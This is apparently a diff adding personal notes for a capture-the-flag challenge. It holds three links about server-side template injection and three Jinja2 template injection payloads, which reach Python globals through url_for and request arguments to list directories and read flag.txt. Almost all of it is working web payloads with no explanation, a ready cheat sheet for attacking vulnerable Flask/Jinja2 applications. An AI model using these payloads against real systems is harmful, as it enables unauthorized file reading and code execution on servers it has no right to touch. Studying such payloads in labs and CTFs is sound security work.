@@ -1,0 +1,10 @@
+https://ctftime.org/writeup/11014
+https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
+https://hackmd.io/@Chivato/HyWsJ31dI
+
+
+{{url_for|attr(request.args.f)}} &f=__globals__
+
+{{url_for[request.args.f].os.__dict__.listdir('./')}}
+
+{{url_for[request.args.f].__builtins__.open('flag.txt').read()}}
